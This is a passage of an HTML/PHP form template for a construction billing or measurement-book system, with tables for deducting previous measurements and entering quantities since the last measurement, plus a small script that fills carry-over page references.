						<td align="center" colspan="7">Deduct Previous Measurement</td>
					</tr>
					<tr>
						<td align="left" colspan="7" bgcolor="#f2efef">
						Deduct Previous Measurement Total Quantity&nbsp;&nbsp;&nbsp;:&nbsp;&nbsp;
						<input type="text" name="txt_dpm_qty" id="txt_dpm_qty" size="17" class="popuptextbox" style="text-align:left; background-color:#f2efef" />
						</td>
					</tr>
					<tr>
						<td width="10px" rowspan="2" align="center">RBN.</td>
						<td width="61px" rowspan="2" align="center">Item Qty.</td>
						<td width="63px" rowspan="2" align="center">Rate&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px;'></i> </td>
						<td colspan="2" align="center" bgcolor="#eaeae8">Paid Details</td>
						<td colspan="2" align="center" bgcolor="#eaeae8">Payable Details</td>
					</tr>
					<tr>
						<td width="23px" align="center">(%)</td>
						<td width="110px" align="center">Amount&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px;'></i> </td>
						<td width="23px" align="center">(%)</td>
						<td style='width:110px' align="center">Amount <i class='fa fa-inr' style=' width:4px; height:5px;'></i> </td>
					</tr>
					<tr>
						<td colspan="4" align="right">Total Amount <i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;</td>
						<td align="left"><input type="text" name="txt_partpay_total_paidamt_dpm" id="txt_partpay_total_paidamt_dpm" class="dynamictextbox" style="text-align:right; width:100px;pointer-events: none;" /></td>
						<td colspan=""></td>
						<td colspan=""><input type="text" name="txt_partpay_total_payableamt_dpm" id="txt_partpay_total_payableamt_dpm" class="dynamictextbox" style="text-align:right; width:100px;pointer-events: none;" /></td>
					</tr>
					<tr>
						<td colspan="7">Remarks:<br/><textarea name="txt_dpm_remarks" id="txt_dpm_remarks" rows="3" style="width:519px;"></textarea>
						</td>
					</tr>
				</table>
				</div>
				<div style="float:right;  width:427px; height:320px; overflow-y: auto;">
					<table class="label table2" cellpadding="3" cellspacing="3" width="93%" id="table4">
						<tr bgcolor="#0080ff" style="color:#FFFFFF">
							<td align="center" colspan="5">Since Last Measurement</td>
						</tr>
						<tr>
							<td align="left" colspan="5" bgcolor="#f2efef">
							Since Last Measurement Quantity&nbsp;:&nbsp;
							<input type="text" name="txt_slm_qty" id="txt_slm_qty" size="13" class="popuptextbox" style="text-align:left; background-color:#f2efef" />
							<input type="hidden" name="hid_slm_qty" id="hid_slm_qty" size="13" class="popuptextbox" style="text-align:left; background-color:#f2efef" />
							</td>
						</tr>
						<tr>
							<td width="61px" align="center">Item Qty.</td>
							<td width="63px" align="center">Rate&nbsp;<i class='fa fa-inr' style=' width:4px; height:5px;'></i></td>
							<td width="23px" align="center">(%)</td>
							<td width="50px" align="center">Amount&nbsp;<i class='fa fa-inr' style=' width:4px; height:5px;'></i></td>
							<td width="10px" align="center">&nbsp;</td>
						</tr>
						<tr id='rowid0'>
							<td width="61px" align="center" class="dynamicrowcell">
							<input type="text" name="txt_partpay_qty_slm[]" id="txt_partpay_qty_slm0" class="dynamictextbox" style="text-align:right; width:93px; border: 1px solid #2aade4;" onblur="ValidateSlm(); calculateAmount(this,0,'qty','slm');" />
							</td>
							<td width="63px" align="center" class="dynamicrowcell">
							<input type="text" name="txt_item_rate_slm" readonly="" id="txt_item_rate_slm0" class="dynamictextbox" style="text-align:right; width:80px;" onblur="calculateAmount(this,0,'rate','slm');" />
							</td>
							<td width="23px" align="center" class="dynamicrowcell">
							<input type="text" name="txt_partpay_percent_slm" id="txt_partpay_percent_slm0" class="dynamictextbox" style="text-align:right; width:40px; border: 1px solid #2aade4;" onblur="ValidatePercent(this,'slm',0); calculateAmount(this,0,'percent','slm');" />
							</td>
							<td width="50px" align="center" class="dynamicrowcell">
							<input type="text" name="txt_partpay_amt_slm[]" id="txt_partpay_amt_slm0" class="dynamictextbox" style="text-align:right; width:130px;pointer-events: none;" />
							</td>
							<td width="10px" align="center" class="dynamicrowcell" style="text-align:center;">
							<input type="button" name="btn_add_row_slm" id="btn_add_row_slm" class="editbtnstyle" value=" + " style="width:32px; text-align:center; font-weight:bold; border-radius: 0px;" onclick="addRow();" />
							<input type="hidden" name="hid_slm_result[]" id="hid_slm_result0" class="dynamictextbox" />
							</td>
						</tr>
						<tr>
							<td width="147px" colspan="3" align="right">Total Amount&nbsp;<i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;</td>
							<td width="50px" align="right"  class="dynamicrowcell">
							<input type="text" name="txt_partpay_total_amt_slm" id="txt_partpay_total_amt_slm" class="dynamictextbox" style="text-align:right; width:130px;pointer-events: none;" />
							</td>
							<td width="10px" align="center">&nbsp;</td>
						</tr>
						<tr>
							<td colspan="5">Remarks:<br/><textarea name="txt_slm_remarks" id="txt_slm_remarks" rows="3" style="width:375px;"></textarea>
							</td>
						</tr>
					</table>
				</div>
			</div>
			<div align="right">
				<table width="100%" height="65" class="label" cellpadding="3" cellspacing="3">
					<tr>
					<td align="right" width="440px">
					<label style="background:#EAEAEA; padding:6px;">Over All Total Amount</label>&nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;
					<input type="text" name="txt_overall_total" id="txt_overall_total" size="20" class="dynamictextbox dynamictextbox2" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
					</td>
					</tr>
				</table>
			</div>
			<div class="bottomsection" align="center">
				<div class="buttonsection" align="center"><input type="button" name="btn_save" id="btn_save" value=" Save " class="buttonstyle" onclick="SaveData()" /></div>
				<div class="buttonsection" align="center"><input type="button" name="btn_cancel" id="btn_cancel" value=" Cancel " class="buttonstyle" onclick="CancelData()" /></div>
			</div>
		</div>
		
		<!-- preload the images -->
		<!--<div style='display:none'>
			<img src='img/basic/x.png' alt='' />
		</div>     -->
</form>
<script type="text/javascript">
	$(function(){ 
		var textBoxStr = "<?php echo $DIEITextBoxStr; ?>";
		if(textBoxStr != "")
		{
			var splitval = textBoxStr.split("*"); //alert(splitval.length);
			var x=0;
			for(x=0;x<splitval.length;x+=3)
			{
				document.getElementById("txt_co_di_ei"+splitval[x]).value = "C/o to page "+splitval[x+1]+"/General MB No. "+splitval[x+2]; 
			}
		}
   });
</script>
</body>

</html>